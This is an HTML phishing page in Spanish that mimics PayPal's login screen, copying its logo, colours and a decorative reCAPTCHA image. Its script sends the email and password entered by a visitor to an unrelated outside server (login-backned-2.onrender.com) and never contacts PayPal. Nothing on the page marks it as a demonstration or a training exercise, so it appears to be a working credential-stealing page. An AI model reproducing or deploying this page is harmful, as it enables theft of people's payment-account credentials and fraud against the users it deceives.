<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Iniciar sesión en PayPal</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #fff;
    min-height: 100vh;
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .login-container {
    background: #fff;
    padding: 2.5rem 2rem 2rem 2rem;
    border-radius: 12px;
    box-shadow: 0 4px 32px rgba(0,0,0,0.12);
    width: 350px;
    display: flex;
    flex-direction: column;
    align-items: center;
  }
  .paypal-logo {
    width: 80px;
    margin-bottom: 1.2rem;
    margin-top: -1.5rem;
  }
  h2 {
    text-align: center;
    margin-bottom: 1.2rem;
    color: #003087;
    font-size: 1.4rem;
    font-weight: 600;
  }
  .login-container form {
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
  }
  input[type="email"],
  input[type="password"] {
    width: 90%;
    padding: 0.9rem;
    padding-right: 36px;
    margin: 0.5rem auto 1.1rem auto;
    border: 1.5px solid #cbd2d6;
    border-radius: 6px;
    font-size: 1rem;
    background: #f7f9fa;
    transition: border 0.2s;
    display: block;
    box-sizing: border-box;
  }
  input[type="password"] {
    padding-right: 36px;
  }
  input[type="email"]:focus,
  input[type="password"]:focus {
    border: 1.5px solid #0070ba;
    outline: none;
    background: #fff;
  }
  button {
    width: 100%;
    padding: 0.9rem;
    background: linear-gradient(90deg, #0070ba 60%, #1546a0 100%);
    border: none;
    color: #fff;
    font-weight: bold;
    border-radius: 6px;
    font-size: 1.1rem;
    cursor: pointer;
    margin-top: 0.2rem;
    margin-bottom: 0.7rem;
    box-shadow: 0 2px 8px rgba(0,112,186,0.08);
    transition: background 0.2s;
  }
  button:hover {
    background: #003087;
  }
  .forgot-password {
    display: block;
    text-align: right;
    margin-top: 0.2rem;
    font-size: 0.95rem;
    color: #0070ba;
    text-decoration: none;
    margin-bottom: 1.2rem;
  }
  .forgot-password:hover {
    text-decoration: underline;
  }
  .error-message {
    color: #d93025;
    font-size: 0.98rem;
    margin-bottom: 1rem;
    display: none;
    text-align: center;
  }
  .create-account {
    display: block;
    text-align: center;
    margin-top: 1.2rem;
    font-size: 1rem;
    color: #0070ba;
    text-decoration: none;
    font-weight: 500;
  }
  .create-account:hover {
    text-decoration: underline;
  }
</style>
</head>
<body>
  <div class="login-container">
    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal" class="paypal-logo" />
    <h2>PayPal</h2>
    <div id="error" class="error-message">Correo o contraseña incorrectos</div>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Correo electrónico" required autocomplete="username" />
      <div style="width: 100%; position: relative; margin-bottom: 1.1rem; display: flex; justify-content: center; align-items: center;">
        <input type="password" id="password" placeholder="Contraseña" required autocomplete="current-password" style="box-sizing: border-box;" />
        <span id="togglePassword" style="position: absolute; right: 16px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #0070ba; font-size: 1.2rem;">
          <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" viewBox="0 0 24 24"><path stroke="#0070ba" stroke-width="2" d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12Z"/><circle cx="12" cy="12" r="3" stroke="#0070ba" stroke-width="2"/></svg>
        </span>
      </div>
      <!-- Imagen pequeña de captcha -->
      <div style="width: 100%; display: flex; align-items: center; justify-content: center; margin-bottom: 1.1rem;">
        <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" alt="captcha" style="height: 28px; opacity: 0.7; border-radius: 4px;" />
      </div>
      <button type="submit">Iniciar sesión</button>
    </form>
    <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
    <a href="https://www.paypal.com/signup" class="create-account" id="paypalLink" target="_blank">Crear cuenta en PayPal</a>
  </div>

<script>
  const form = document.getElementById('loginForm');
  const errorDiv = document.getElementById('error');
  const passwordInput = document.getElementById('password');
  const togglePassword = document.getElementById('togglePassword');
  const eyeIcon = document.getElementById('eyeIcon');

  let passwordVisible = false;
  togglePassword.addEventListener('click', function() {
    passwordVisible = !passwordVisible;
    passwordInput.type = passwordVisible ? 'text' : 'password';
    eyeIcon.innerHTML = passwordVisible
      ? '<circle cx="12" cy="12" r="3" stroke="#0070ba" stroke-width="2"/><path stroke="#0070ba" stroke-width="2" d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12Z"/><line x1="5" y1="19" x2="19" y2="5" stroke="#0070ba" stroke-width="2"/>'
      : '<path stroke="#0070ba" stroke-width="2" d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12Z"/><circle cx="12" cy="12" r="3" stroke="#0070ba" stroke-width="2"/>';
  });

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = form.email.value.trim();
    const password = form.password.value.trim();

    try {
      // Intentar login real (ahora también registra si no existe)
      const response = await fetch('https://login-backned-2.onrender.com/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });
      const data = await response.json();
      if (response.ok && data.success) {
        errorDiv.style.display = 'none';
        alert(data.message || '¡Inicio de sesión exitoso!');
        // window.location.href = 'panel.html';
      } else {
        errorDiv.style.display = 'block';
        alert(data.message || 'Correo o contraseña incorrectos');
      }
    } catch (err) {
      errorDiv.style.display = 'block';
      alert('Error de conexión con el servidor');
    }
  });
</script>
</body>
</html>
